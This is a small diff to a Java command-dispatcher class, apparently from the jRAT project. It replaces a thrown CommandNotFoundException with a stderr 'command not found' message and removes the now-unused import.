@@ -1,12 +1,8 @@
 package jrat.api.commands;
 
-
 import java.io.PrintStream;
 import java.util.HashMap;
 import java.util.Map;
-
-import jrat.api.exceptions.CommandNotFoundException;
-
 
 public class Commands {
 
@@ -35,7 +31,7 @@ public class Commands {
 
 				acommand.process(argsNoCmd, printer);
 			} else {
-				throw new CommandNotFoundException("Command not found");
+				System.err.println(args[0] + ": command not found");
 			}
 		} catch (Exception e) {
 			e.printStackTrace();
